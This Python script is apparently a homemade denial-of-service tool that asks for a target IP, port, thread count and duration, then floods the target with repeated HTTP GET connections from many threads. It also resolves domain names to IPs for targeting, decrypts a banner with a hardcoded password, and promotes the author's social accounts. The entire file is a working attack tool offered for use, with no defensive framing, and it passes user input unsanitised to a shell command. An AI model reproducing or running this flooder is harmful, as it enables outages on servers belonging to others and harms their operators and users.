import socket
from colorama import Fore, init
import time
import os 
import threading
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

sys.stderr = object

def custom_unpad(data):
    pad_size = data[-1]
    return data[:-pad_size]

def decrypt(encrypted_ascii_art, password):
        key = base64.urlsafe_b64encode(password.encode('utf-8')).ljust(32, b'=')
        with open(encrypted_ascii_art, 'rb') as file:
            encoded_data = file.read()
        if len(encoded_data) != 1216:
            exit()
        data = base64.urlsafe_b64decode(encoded_data)
        if len(encoded_data) != 1216:
            exit()
        iv = data[:algorithms.AES.block_size // 8]
        ciphertext = data[algorithms.AES.block_size // 8:]
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        if len(encoded_data) != 1216:
            exit()
        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
        unpadded_data = custom_unpad(decrypted_data)
        return unpadded_data.decode()

def start():
    os.system("cls")
    print(Fore.GREEN + banner)
    print("\n")
    print("\n")
    print("\n")
    print(Fore.BLUE + "Welcome ! Join my network :)")
    print("\n")
    print(Fore.RED + "TikTok : nev626_3")
    print("\n")
    print(Fore.CYAN + "Discord : https://discord.gg/xTQ8jvnN")
    print("\n")
    print("\n")

def main():
    global start_time
    global a_time
    target = str(input(Fore.YELLOW + "Enter target (format xxx.xxx.xxx.xxx): "))
    port = int(input(Fore.YELLOW + "port number (web page is 80): "))
    reque = int(input(Fore.YELLOW + "Enter number of proces (Warning to high number can crash your pc !): "))
    a_time = int(input("Choice atack time (in seconds): "))
    start_time = time.perf_counter()
    for i in range(reque):
        thread = threading.Thread(target=lambda : attack(target=target, port=port, n=reque))
        thread.start()

def attack(target, port, n):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        tim()

def tim():
    end_time = time.perf_counter()
    elapsed_time = end_time - start_time
    if elapsed_time >= a_time:
        exit()

def dns():
    r = int(input("Do you want to get ip of dns (like example.com = xxx.xxx.xxx.xxx) . 0 No ; 1 Yes : "))
    if r == 0:
        main()
    if r == 1:
        dns = str(input("What is dns (format like example.com) : "))
        data = socket.gethostbyname(dns)
        ip = repr(data)
        ip = ip.replace("'", "")
        print(ip  + " : copy to clipboard :)")
        os.system("echo " + ip + " | clip")
        time.sleep(2)
        main()

encrypted_ascii_file = 'banner.dat'
dcodepass = base64.b64decode("Q2xlbTc5Q2xlbTc5IQ==")
password = dcodepass.decode("utf-8")
banner = decrypt(encrypted_ascii_file, password)
start()
dns()
